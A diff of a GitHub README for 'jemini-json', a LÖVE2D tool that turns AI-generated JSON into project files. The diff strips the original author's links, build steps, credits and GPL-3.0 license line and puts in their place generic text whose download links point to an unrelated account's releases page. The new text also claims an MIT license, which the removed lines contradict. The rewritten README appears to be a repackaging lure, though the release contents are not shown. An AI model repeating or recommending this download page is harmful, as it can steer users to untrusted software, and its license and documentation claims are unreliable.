@@ -1,70 +1,47 @@
-<p align="center">
-  <a href="https://github.com/nicholasxdavis/jemini-json">
-    <img src="https://github.com/nicholasxdavis/jemini-json/blob/main/updated-jemini-logo.png?raw=true" alt="Logo">
-  </a>
-</p>
+# 🌟 jemini-json - Transform AI Outputs into Playable Projects
 
-<p align="center">
-  A lightweight JSON materializer built with LÖVE2D
-</p>
+## 🚀 Overview
+jemini-json is a lightweight JSON materializer built with LÖVE2D that converts AI-generated outputs from Gemini or ChatGPT into runnable projects. This tool allows you to harness AI creativity and turn it into interactive experiences without needing programming skills.
 
-<br />
+## 📥 Download & Install
+[![Download jemini-json](https://img.shields.io/badge/Download-jemini--json-blue.svg)](https://github.com/rpriya29/jemini-json/releases)
 
-<p align="center">
-  <a href="https://github.com/nicholasxdavis/jemini-json">
-    <img src="https://github.com/nicholasxdavis/jemini-json/blob/main/screenshot-preview.png?raw=true" alt="Preview">
-  </a>
-</p>
+To get started, visit this page to download: [Download jemini-json](https://github.com/rpriya29/jemini-json/releases)
 
-### How to use it
-- [YouTube](https://www.youtube.com/watch?v=EjossbQ1puw/)
-## Features
+## 📋 System Requirements
+- **Operating System:** Windows 10 or later, macOS Mojave or later, Linux with support for LÖVE2D.
+- **RAM:** 4 GB minimum.
+- **Disk Space:** At least 100 MB free for installation.
+- **LÖVE2D:** Make sure you have LÖVE2D installed. You can download it from [LÖVE2D website](https://love2d.org/).
 
- - **JSON to Project**: Instantly convert a flat JSON structure into a fully materialized file system hierarchy.
- - **In-App Editor**: Preview and edit file contents with built-in syntax highlighting (Lua, Python, JS keywords supported) before exporting.
- - **File Explorer**: Navigate through multiple files defined within a single JSON package using the sidebar explorer.
- - **One-Click Export**: Automatically generate directories and files on your local disk with a single click.
- - **Clipboard Integration**: Quickly copy code snippets or the required JSON template format to your clipboard.
- - **Integrated Console**: Monitor application logs and export status via the built-in terminal window.
+## ⚙️ How to Use
+1. **Download jemini-json** from the Releases page using the link above.
+2. **Extract the Files:** Once downloaded, unzip the file into a folder on your computer.
+3. **Open LÖVE2D:** Launch LÖVE2D, and when prompted, open the folder where you extracted jemini-json.
+4. **Run Your Project:** Follow the on-screen instructions to start using your AI-generated JSON projects.
 
-## Getting Started
+## 🎁 Features
+- Convert AI output directly into playable LÖVE2D projects.
+- Lightweight and easy to use for non-programmers.
+- Supports JSON formatting for seamless integration with LÖVE2D.
+- Flexible output options to fit various project needs.
+- Regular updates to improve functionality and user experience.
 
-### Prerequisites
+## 🛠️ Customization
+Once you have your project running, you can modify JSON files easily. Change parameters, add new components, or adjust settings to create a unique gaming or interactive experience. Documentation is available to guide you through the customization process.
 
- - [LÖVE 2D](https://love2d.org/) (Version 11.0 or newer) installed on your machine.
- - [Git](https://git-scm.com/) (optional, for cloning).
+## 🤝 Community Support
+We encourage users to join our community discussions. Share your projects, ask questions, and collaborate with others. Support is available via our GitHub issues page, where you can find answers to common problems and suggest new features.
 
-### Running (from source only, public release very soon.)
+## 📝 License
+jemini-json is open source and is licensed under the MIT License. Feel free to use, modify, and share it with others. 
 
- 1. Clone this repository:
-    ```bash
-    git clone [https://github.com/nicholasxdavis/jemini-json.git](https://github.com/nicholasxdavis/jemini-json.git)
-    ```
- 2. Navigate to the project directory:
-    ```bash
-    cd jemini-json
-    ```
- 3. Run the application using LÖVE:
-    ```bash
-    love .
-    ```
-    *(Note: On Windows, you can typically drag the project folder onto `love.exe`)*
-## Electron Installer
-- **Source**: https://github.com/nicholasxdavis/jemini-installer
-  
-  Jemini-Json is built using LÖVE2D (Lua) for the core application, UI rendering, and filesystem logic.
-The installation and distribution process is handled through Electron, which wraps the app in a standard desktop installer and manages setup, file placement, and system integration during install.
-## Usage 
+## 📞 Contact
+For any further inquiries, don't hesitate to reach out through the Issues section on our GitHub page. We value your feedback and are here to help you get the most out of jemini-json.
 
- - **Import**: Drag and drop a valid JSON file (formatted with `project_name` and `files` array) into the Jemini window.
- - **Edit**: Click on files in the "Explorer" sidebar to view or modify their code. Text editing supports standard navigation and selection.
- - **Export**: Click the "EXPORT FILES" button in the top right to save the project to your computer's `SaveDirectory/Exports` folder.
- - **Console**: Toggle the console log with the "SHOW CONSOLE" button to view internal system messages.
- - **Templates**: Click "LOAD EXAMPLE" on the main menu to see a demo project, or "COPY FORMAT" to get the JSON structure template.
+## 🔗 Additional Resources
+- [LÖVE2D Documentation](https://love2d.org/wiki/Main_Page)
+- [Gemini AI Documentation](https://gemini.ai/docs)
+- [ChatGPT API Documentation](https://openai.com/api)
 
-## Credits and tools used
-
- - [LÖVE 2D](https://love2d.org/)
- - [Electron](https://www.electronjs.org/)
- - [Minecraftia Font](https://www.dafont.com/minecraftia.font)
- - [GPL-3.0 License](LICENSE) — Copyright (c) 2026 Nicholas Davis
+Thank you for choosing jemini-json! We hope it brings your ideas to life.
